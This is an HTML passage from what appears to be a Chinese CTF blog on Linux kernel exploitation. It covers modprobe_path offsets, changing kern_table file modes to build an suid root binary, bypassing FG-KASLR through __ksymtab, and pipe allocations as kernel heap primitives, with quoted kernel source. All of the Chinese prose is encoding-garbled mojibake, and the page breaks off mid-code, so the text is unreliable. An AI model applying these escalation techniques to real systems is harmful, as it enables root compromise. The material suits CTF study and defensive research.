<p>ä½†æ˜¯è§‚å¯Ÿä¹Ÿå¯ä»¥çœ‹åˆ°ï¼Œå…¶å®åç§»å‘ç”Ÿçš„è¯ï¼Œç›¸å¯¹äºæ˜ å°„åŒºåŸŸï¼Œåªæœ‰ä¸€ä¸ªå­—èŠ‚å‘ç”Ÿæ”¹å˜ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å°è¯•çˆ†ç ´è¿™ä¸€ä¸ªå­—èŠ‚æ¥è·å–ã€‚</p>

        <h5 id="ext4"   >
          <a href="#ext4" class="heading-link"><i class="fas fa-link"></i></a><a href="#ext4" class="headerlink" title="ext4"></a>ext4</h5>
      <p>è¿™ä¸ªæ–‡ä»¶ç³»ç»Ÿçš„ä¹Ÿæ¯”è¾ƒå¸¸è§ï¼Œä¸è¿‡æ¯”è¾ƒå¥½çš„ä¸€ç‚¹å°±æ˜¯ï¼Œå®é™…æµ‹è¯•ç»“æœå‘ç°æ˜ å°„å’Œå¤åˆ¶çš„åç§»åœ¨å¼€å¯KASLRä¹‹åéƒ½ä¸ä¼šå‘ç”Ÿæ”¹å˜ï¼Œæ‰€ä»¥æµ‹å‡ºæ¥å°±å¯ä»¥ç›´æ¥ä½¿ç”¨äº†ã€‚</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">v5.15.26</span><br><span class="line">#modprobe_map 0x3502530</span><br><span class="line">#modprobe_copy 0x264e608</span><br></pre></td></tr></table></div></figure>

<p>è¿™ä¸ªä¸»è¦æ˜¯æœ€è¿‘çš„LINECTFä¸Šçš„encryptè¿™ä¸ªå†…æ ¸é¢˜äº‹åçœ‹WPå‡ºæ¥çš„ï¼Œå¿˜è®°å“ªä½å¸ˆå‚…äº†ã€‚</p>

        <h3 id="å…¶ä»–çŒœæƒ³"   >
          <a href="#å…¶ä»–çŒœæƒ³" class="heading-link"><i class="fas fa-link"></i></a><a href="#å…¶ä»–çŒœæƒ³" class="headerlink" title="å…¶ä»–çŒœæƒ³"></a>å…¶ä»–çŒœæƒ³</h3>
      <p>ä¹‹å‰çš„<code>kern_table</code>çš„ç»“æ„å¯ä»¥çœ‹åˆ°ï¼Œæ¯ä¸ªæ–‡ä»¶éƒ½æœ‰<code>.mode</code>å±æ€§ï¼Œè¿™ä¸ªå±æ€§å…¶å®å°±æ˜¯è¯¥æ–‡ä»¶çš„æƒé™å±æ€§ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬è¾“å…¥<code>ls -al file</code>å‡ºæ¥çš„ç›¸å…³æƒé™</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220329193540405.png" alt="image-20220329193540405"></p>
<p>æˆ‘ä»¬ä¹Ÿå¯ä»¥å¯¹å…¶è¿›è¡Œæ“æ§ã€‚</p>

        <h4 id="æƒé™æ›´æ”¹"   >
          <a href="#æƒé™æ›´æ”¹" class="heading-link"><i class="fas fa-link"></i></a><a href="#æƒé™æ›´æ”¹" class="headerlink" title="æƒé™æ›´æ”¹"></a>æƒé™æ›´æ”¹</h4>
      <p>çŒœæƒ³ä¸€ä¸‹å¦‚æœæ›´æ”¹è¯¥æ–‡ä»¶ï¼Œä½¿å…¶å†…å®¹å˜ä¸ºä¸€ä¸ªå¯æ‰§è¡Œçš„elfæ–‡ä»¶ï¼ŒåŠŸèƒ½ä¸º<code>cat /flag</code>ï¼Œç„¶åæ›´æ”¹å…¶æƒé™ï¼Œèµ‹äºˆsuidçš„æƒé™ï¼Œé‚£ä¹ˆåœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œå°±å¯ä»¥ä»¥rootæƒé™æ¥<code>cat flag</code>ã€‚å½¢å¼å¦‚ä¸‹</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220329205636964.png" alt="image-20220329205636964"></p>

        <h4 id="å­˜åœ¨é—®é¢˜"   >
          <a href="#å­˜åœ¨é—®é¢˜" class="heading-link"><i class="fas fa-link"></i></a><a href="#å­˜åœ¨é—®é¢˜" class="headerlink" title="å­˜åœ¨é—®é¢˜"></a>å­˜åœ¨é—®é¢˜</h4>
      <p>ä½†æ˜¯è¿™é‡Œæœ‰ç‚¹é—®é¢˜ï¼Œæˆ‘å®é™…æ“ä½œçš„æ—¶å€™ï¼Œæƒé™å€’æ˜¯å¾ˆå®¹æ˜“æ›´æ”¹ï¼Œä½†æ˜¯å†…å®¹ä¸èƒ½å†™å…¥<code>\x00</code>å’Œ<code>\n</code>ï¼Œå°±å¾ˆä¸å¥½åˆ¶ä½œä¸€ä¸ªå¯æ‰§è¡Œçš„ELFæ–‡ä»¶ï¼Œä¸çŸ¥é“æœ‰æ²¡æœ‰ä»€ä¹ˆå…¶ä»–åŠæ³•ç»•è¿‡ã€‚</p>
<p>å¯å‚è€ƒï¼š<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://tinylab-1.gitbook.io/cbook/02-chapter8" >æ‰“é€ å²ä¸Šæœ€å°å¯æ‰§è¡ŒELFæ–‡ä»¶(45å­—èŠ‚) - C è¯­è¨€ç¼–ç¨‹é€è§† (gitbook.io)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>æ­¤å¤–ä¹‹å‰Pç¥çš„æ–‡ç« ä¹Ÿæåˆ°ï¼Œå¦‚æœåªæ˜¯suidçš„æƒé™çš„è¯ï¼Œç”¨shellè„šæœ¬æ˜¯ä¸è¡Œçš„ï¼Œæ‰€ä»¥è¿™æ–¹é¢ä¹Ÿä¸å¤ªèƒ½å¤Ÿæå®šã€‚</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html" >è°ˆä¸€è°ˆLinuxä¸suidææƒ | ç¦»åˆ«æ­Œ (leavesongs.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>è‡³ä»Šè¿˜æ˜¯ä¸çŸ¥é“æœ‰æ²¡æœ‰ä»€ä¹ˆå…¶ä»–çš„æ–¹æ³•æ¥ç»•è¿‡ã€‚</p>

        <h2 id="6-ksymtabæ•°ç»„"   >
          <a href="#6-ksymtabæ•°ç»„" class="heading-link"><i class="fas fa-link"></i></a><a href="#6-ksymtabæ•°ç»„" class="headerlink" title="6.__ksymtabæ•°ç»„"></a>6.__ksymtabæ•°ç»„</h2>
      
        <h3 id="å‰ç½®çŸ¥è¯†-2"   >
          <a href="#å‰ç½®çŸ¥è¯†-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#å‰ç½®çŸ¥è¯†-2" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h3>
      <p>é€šå¸¸ç”¨åœ¨å¼€å¯<code>FG-KASLR</code>çš„æƒ…å†µï¼Œè¯¥ä¿æŠ¤éœ€è¦ç¼–è¯‘æ—¶å¼€å¯</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CONFIG_FG_KASLR=y</span><br><span class="line">CONFIG_MODULE_FG_KASLR=y #æ¨¡å—éšæœºåŒ–</span><br></pre></td></tr></table></div></figure>

<p>é€šè¿‡<code>nofgkaslr</code>æ¥å…³é—­</p>
<p>ä¸è¿‡æˆ‘åœ¨ç¼–è¯‘è®¾ç½®<code>.config</code>çš„æ—¶å€™ï¼Œæ²¡æœ‰æ‰¾åˆ°è¿™äº›é€‰é¡¹ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆã€‚</p>
<p>å‚è€ƒï¼š</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/kernel-mode/defense/randomization/fgkaslr/#__ksymtab" >FGKASLR - CTF Wiki (ctf-wiki.org)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://zhangyidong.top/2021/02/10/kernel_pwn(fg_kaslr)/" >Kernel_pwn FG_KASLR in ROP | An9Ela (zhangyidong.top)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>ä¸»è¦åœ¨äº</p>
<ul>
<li><p>å†…æ ¸ç¬¦å·è¡¨<code>__ksymtab </code></p>
</li>
<li><p><code>.data</code></p>
</li>
<li><p><code>swapgs_restore_regs_and_return_to_usermode</code></p>
</li>
<li><p><code>modprobe_path</code></p>
</li>
<li><p>å­˜åœ¨äº<code>.text_base</code>åˆ°<code>__x86_retpoline_r15</code>çš„å‡½æ•°æ²¡æœ‰å—åˆ°å½±å“ã€‚æ˜¾ç„¶<code>commit_creds</code>å’Œ<code>prepare_kernel_cred()</code>æ²¡æœ‰åŒ…å«åœ¨å†…ï¼Œä½†æ˜¯å¯ä»¥åœ¨é‡Œé¢å¯»æ‰¾ä¸€äº›gadget</p>
</li>
</ul>
<p>ä»¥ä¸Šå‡ä¸ä¼šå‘ç”Ÿ<code>FG-KASLR</code>çš„éšæœºåŒ–</p>
<p>é‚£ä¹ˆè¿™é‡Œå°±æ˜¯ä¸»è¦å…³æ³¨äº<code>__ksymtab</code>æ•°ç»„ï¼Œå­˜åœ¨äºè¯¥æ•°ç»„ä¸­çš„æ¯ä¸€ä¸ªå‡½æ•°å—éƒ½æœ‰å¦‚ä¸‹ç»“æ„</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.17 /include/linux/export.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kernel_symbol</span> &#123;</span></span><br><span class="line">	<span class="keyword">int</span> value_offset;</span><br><span class="line">	<span class="keyword">int</span> name_offset;</span><br><span class="line">	<span class="keyword">int</span> namespace_offset;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>æ³¨æ„æ˜¯åœ¨v5.17ä¸‹ï¼Œåœ¨ä½ç‰ˆæœ¬ä¸‹å¥½åƒåå­—æœ‰ç‚¹ä¸åŒï¼Œä¸è¿‡ä¹Ÿå¤§åŒå°å¼‚</p>

        <h3 id="ç»•è¿‡FG-KASLR"   >
          <a href="#ç»•è¿‡FG-KASLR" class="heading-link"><i class="fas fa-link"></i></a><a href="#ç»•è¿‡FG-KASLR" class="headerlink" title="ç»•è¿‡FG-KASLR"></a>ç»•è¿‡FG-KASLR</h3>
      <p>å› ä¸º<code>__ksymtab</code>æ˜¯ä¸ä¼šè¢«è¯¥æœºåˆ¶å½±å“çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬è‚¯å®šå¯ä»¥åœ¨æ²¡æœ‰å¼€å¯KASLRçš„æ—¶å€™é€šè¿‡<code>kallsym</code>æ¥è·å–åˆ°è¯¥åœ°å€ï¼Œæ¥ç€å°±å¯ä»¥æ‰¾åˆ°å¯¹åº”å‡½æ•°çš„<code>kernel_symbol</code>ç»“æ„ä½“åç§»ï¼Œå¦‚ä¸‹æ‰€ç¤º</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220330113641265.png" alt="image-20220330113641265"></p>
<p>æ‰€ä»¥å°±å¯ä»¥è¿™æ ·æ¥å¾—åˆ°å¯¹åº”çš„ä»»æ„åœ°å€ï¼Œè®¡ç®—çš„æ—¶å€™å¯ä»¥è¿™æ ·è®¡ç®—ï¼Œé€šè¿‡è¡¥ç æ¥è¿›è¡Œè®¡ç®—æ›´å¿«ä¸€ç‚¹ã€‚</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220330113813160.png" alt="image-20220330113813160"></p>

        <h2 id="7-pipeç®¡é“â€”kmalloc-1024-kmalloc-192"   >
          <a href="#7-pipeç®¡é“â€”kmalloc-1024-kmalloc-192" class="heading-link"><i class="fas fa-link"></i></a><a href="#7-pipeç®¡é“â€”kmalloc-1024-kmalloc-192" class="headerlink" title="7.pipeç®¡é“â€”kmalloc-1024/kmalloc-192"></a>7.pipeç®¡é“â€”kmalloc-1024/kmalloc-192</h2>
      <p>å‚ç…§ï¼š<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/Rong_Toa/article/details/116270704" >(31æ¡æ¶ˆæ¯) Linuxç³»ç»Ÿè°ƒç”¨ï¼špipe()ç³»ç»Ÿè°ƒç”¨æºç åˆ†æ_rtoaxçš„åšå®¢-CSDNåšå®¢_linux pipe æºç </a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>****</p>
<p>é€šå¸¸æ¥è®²ï¼Œç®¡é“ç”¨æ¥åœ¨çˆ¶è¿›ç¨‹å’Œå­è¿›ç¨‹ä¹‹é—´é€šä¿¡ï¼Œå› ä¸º<code>fork</code>å‡ºæ¥çš„å­è¿›ç¨‹ä¼šç»§æ‰¿çˆ¶è¿›ç¨‹çš„æ–‡ä»¶æè¿°ç¬¦å‰¯æœ¬ã€‚è¿™é‡Œå°±ä½¿ç”¨å½“å‰è¿›ç¨‹æ¥åˆ›å»ºç®¡é“ç¬¦ï¼Œä»ç®¡é“çš„è¯»å–ç«¯(<code>pipe_fd[0]</code>)å’Œå†™å…¥ç«¯(<code>pipe_fd[1]</code>)æ¥è¿›è¡Œåˆ©ç”¨ã€‚</p>

        <h3 id="1-ä½¿ç”¨æ–¹æ³•"   >
          <a href="#1-ä½¿ç”¨æ–¹æ³•" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-ä½¿ç”¨æ–¹æ³•" class="headerlink" title="(1)ä½¿ç”¨æ–¹æ³•"></a>(1)ä½¿ç”¨æ–¹æ³•</h3>
      
        <h4 id="â‘ åˆ›å»º"   >
          <a href="#â‘ åˆ›å»º" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘ åˆ›å»º" class="headerlink" title="â‘ åˆ›å»º"></a>â‘ åˆ›å»º</h4>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//ä½¿ç”¨pipeæˆ–è€…pipe2</span></span><br><span class="line"><span class="keyword">int</span> pipe_fd[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">pipe(pipe_fd);<span class="comment">//é»˜è®¤é˜»å¡çŠ¶æ€</span></span><br><span class="line"><span class="comment">//pipe2(pipe_fd,flag);</span></span><br></pre></td></tr></table></div></figure>

<p>å…¶ä¸­<code>pipe2</code>å‡½æ•°æˆ–è€…ç³»ç»Ÿè°ƒç”¨<code>__NR_pipe2</code>çš„<code>flag</code>æ”¯æŒé™¤0ä¹‹å¤–çš„ä¸‰ç§æ¨¡å¼ï¼Œå¯ç”¨åœ¨<code>man</code>æ‰‹å†Œä¸­æŸ¥çœ‹ã€‚</p>
<p>å¦‚æœä¼ å…¥çš„<code>flag</code>ä¸º0ï¼Œåˆ™å’Œ<code>pipe</code>å‡½æ•°æ˜¯ä¸€æ ·çš„ï¼Œæ˜¯é˜»å¡çš„ã€‚</p>
<p>é˜»å¡çŠ¶æ€ï¼šå³å½“æ²¡æœ‰æ•°æ®åœ¨ç®¡é“ä¸­æ—¶ï¼Œå¦‚æœè¿˜è°ƒç”¨<code>read</code>ä»ç®¡é“è¯»å–æ•°æ®ï¼Œé‚£ä¹ˆå°±ä¼šä½¿å¾—ç¨‹åºå¤„äºé˜»å¡çŠ¶æ€ï¼Œå…¶ä»–çš„ä¹Ÿæ˜¯ç±»ä¼¼çš„æƒ…å†µã€‚</p>
<p>ä¼šé»˜è®¤åˆ›å»ºä¸¤ä¸ªfdæ–‡ä»¶æè¿°ç¬¦çš„ï¼Œè¯¥fdæ–‡ä»¶æè¿°ç¬¦æ•ˆæœçš„ç›¸å…³ç»“æ„å¦‚ä¸‹</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9  /fs/pipe.c</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">pipefifo_fops</span> =</span> &#123;</span><br><span class="line">	.open		= fifo_open,</span><br><span class="line">	.llseek		= no_llseek,</span><br><span class="line">	.read_iter	= pipe_read,</span><br><span class="line">	.write_iter	= pipe_write,</span><br><span class="line">	.poll		= pipe_poll,</span><br><span class="line">	.unlocked_ioctl	= pipe_ioctl,</span><br><span class="line">	.release	= pipe_release,</span><br><span class="line">	.fasync		= pipe_fasync,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>æ”¾å…¥åˆ°<code>pipe_fd</code>ä¸­ï¼Œå¦‚ä¸‹</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> pipe_fd[<span class="number">2</span>];</span><br><span class="line">pipe(pipe_fd);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;pipe_fd[0]:%d\n&quot;</span>,pipe_fd[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;pipe_fd[1]:%d\n&quot;</span>,pipe_fd[<span class="number">1</span>]);</span><br></pre></td></tr></table></div></figure>

<p>æ•ˆæœå¦‚ä¸‹ï¼š</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220509161948796.png" alt="image-20220509161948796"></p>
<p>ä¹‹åä½¿ç”¨<code>write/read</code>æ¥å†™å…¥è¯»å–å³å¯ï¼Œæ³¨æ„å†™å…¥ç«¯ä¸º<code>fd[1]</code>ï¼Œè¯»å–ç«¯ä¸º<code>fd[0]</code></p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> buf[<span class="number">0x8</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">char</span>* msg = <span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span>;</span><br><span class="line">write(pipe_fd[<span class="number">1</span>],msg,<span class="number">0x8</span>);</span><br><span class="line">read(pipe_fd[<span class="number">0</span>],buf,<span class="number">0x8</span>);</span><br></pre></td></tr></table></div></figure>




        <h4 id="â‘¡é‡Šæ”¾"   >
          <a href="#â‘¡é‡Šæ”¾" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¡é‡Šæ”¾" class="headerlink" title="â‘¡é‡Šæ”¾"></a>â‘¡é‡Šæ”¾</h4>
      <p>ç”±äº<code>pipe</code>ç®¡é“åˆ›å»ºåä¼šå¯¹åº”åˆ›å»ºæ–‡ä»¶æè¿°ç¬¦ï¼Œæ‰€ä»¥é‡Šæ”¾ä¸¤ç«¯å¯¹åº”çš„æ–‡ä»¶æè¿°ç¬¦å³å¯é‡Šæ”¾ç®¡é“<code>pipe</code>ç®¡é“</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">close(pipe_fd[<span class="number">0</span>]);</span><br><span class="line">close(pipe_fd[<span class="number">1</span>]);</span><br></pre></td></tr></table></div></figure>

<p>éœ€è¦å°†ä¸¤ä¸ªæ–‡ä»¶æè¿°ç¬¦fdéƒ½ç»™é‡Šæ”¾æ‰æˆ–è€…ä½¿ç”¨<code>read</code>å°†ç®¡é“ä¸­æ‰€æœ‰æ•°æ®éƒ½è¯»å–å‡ºæ¥ï¼Œæ‰ä¼šè¿›å…¥<code>free_pipe_info</code>å‡½æ•°æ¥é‡Šæ”¾åœ¨çº¿æ€§æ˜ å°„åŒºåŸŸç”³è¯·çš„ç›¸å…³å†…å­˜èµ„æºï¼Œå¦åˆ™è¿˜æ˜¯ä¸ä¼šè¿›å…¥çš„ã€‚</p>

        <h3 id="2-å†…å­˜åˆ†é…ä¸é‡Šæ”¾"   >
          <a href="#2-å†…å­˜åˆ†é…ä¸é‡Šæ”¾" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-å†…å­˜åˆ†é…ä¸é‡Šæ”¾" class="headerlink" title="(2)å†…å­˜åˆ†é…ä¸é‡Šæ”¾"></a>(2)å†…å­˜åˆ†é…ä¸é‡Šæ”¾</h3>
      
        <h4 id="â‘ åˆ†é…"   >
          <a href="#â‘ åˆ†é…" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘ åˆ†é…" class="headerlink" title="â‘ åˆ†é…"></a>â‘ åˆ†é…</h4>
      <p>å‘ç”Ÿåœ¨è°ƒç”¨<code>pipe</code>/<code>pipe2</code>å‡½æ•°ï¼Œæˆ–è€…ç³»ç»Ÿè°ƒç”¨<code>__NR_pipe</code>/<code>__NR_pipe2</code>æ—¶ï¼Œå†…æ ¸å…¥å£ä¸º</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE2(pipe2, <span class="keyword">int</span> __user *, fildes, <span class="keyword">int</span>, flags)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> do_pipe2(fildes, flags);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">SYSCALL_DEFINE1(pipe, <span class="keyword">int</span> __user *, fildes) <span class="comment">/* pipe() ç³»ç»Ÿè°ƒç”¨ */</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> do_pipe2(fildes, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>å‡½æ•°è°ƒç”¨é“¾ï¼š</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">do_pipe2()-&gt;__do_pipe_flags()-&gt;create_pipe_files()-&gt;get_pipe_inode()-&gt;alloc_pipe_info()</span><br></pre></td></tr></table></div></figure>

<p>è°ƒç”¨ä¹‹åä¼šåœ¨å†…æ ¸çš„çº¿æ€§æ˜ å°„åŒºåŸŸè¿›è¡Œå†…å­˜åˆ†é…ï¼Œä¹Ÿå°±æ˜¯å¸¸è§çš„å†…æ ¸å †ç®¡ç†çš„åŒºåŸŸã€‚åˆ†é…ç‚¹åœ¨å¦‚ä¸‹å‡½æ•°ä¸­ï¼š</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /fs/pipe.c</span></span><br><span class="line"><span class="function">struct pipe_inode_info *<span class="title">alloc_pipe_info</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> pipe_bufs = PIPE_DEF_BUFFERS;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//#define PIPE_DEF_BUFFERS	16</span></span><br><span class="line">    <span class="comment">//.....</span></span><br><span class="line">    <span class="comment">//pipe_inode_infoç®¡ç†ç»“æ„ï¼Œå¤§å°ä¸º0xa0ï¼Œå±äºkmalloc-192</span></span><br><span class="line">	pipe = kzalloc(<span class="keyword">sizeof</span>(struct pipe_inode_info), GFP_KERNEL_ACCOUNT);</span><br><span class="line">	<span class="keyword">if</span> (pipe == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">goto</span> out_free_uid;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//.....</span></span><br><span class="line">    <span class="comment">//ç›¸å…³çš„æ¶ˆæ¯ç»“æ„ä¸ºpipe_bufferæ•°ç»„,æ€»å…±16*0x28=0x280,ç›´æ¥ä»kmalloc-1024ä¸­æ‹¿å–å †å—</span></span><br><span class="line">	pipe-&gt;bufs = kcalloc(pipe_bufs, <span class="keyword">sizeof</span>(struct pipe_buffer),</span><br><span class="line">			     GFP_KERNEL_ACCOUNT);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//.....</span></span><br><span class="line">	<span class="comment">//å¯¹ç”³è¯·çš„pipeç®¡é“è¿›è¡Œä¸€äº›åˆå§‹åŒ–</span></span><br><span class="line">	<span class="keyword">if</span> (pipe-&gt;bufs) &#123;</span><br><span class="line">		init_waitqueue_head(&amp;pipe-&gt;rd_wait);</span><br><span class="line">		init_waitqueue_head(&amp;pipe-&gt;wr_wait);</span><br><span class="line">		pipe-&gt;r_counter = pipe-&gt;w_counter = <span class="number">1</span>;</span><br><span class="line">		pipe-&gt;max_usage = pipe_bufs;</span><br><span class="line">		pipe-&gt;ring_size = pipe_bufs;</span><br><span class="line">		pipe-&gt;nr_accounted = pipe_bufs;</span><br><span class="line">		pipe-&gt;user = user;</span><br><span class="line">		mutex_init(&amp;pipe-&gt;mutex);</span><br><span class="line">		<span class="keyword">return</span> pipe;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//.....</span></span><br><span class="line">    <span class="comment">//å‡ºé”™çš„è¯åˆ™ä¼šé‡Šæ”¾æ‰ï¼Œå…·ä½“å¹²å•¥çš„ä¸å¤ªæ¸…æ¥š</span></span><br><span class="line">out_free_uid:</span><br><span class="line">	free_uid(user);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>ç›¸å…³çš„<code>pipe_inode_info</code>ç»“æ„å¦‚ä¸‹</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /include/linux/pipe_fs_i.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">mutex</span>;</span></span><br><span class="line">	<span class="keyword">wait_queue_head_t</span> rd_wait, wr_wait;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> head;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> tail;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> max_usage;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> ring_size;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line">	<span class="keyword">bool</span> note_loss;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> nr_accounted;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> readers;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> writers;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> files;<span class="comment">//æ–‡ä»¶æè¿°ç¬¦è®¡æ•°ï¼Œéƒ½ä¸º0æ—¶æ‰ä¼šé‡Šæ”¾ç®¡é“</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> r_counter;</span><br><span class="line">	<span 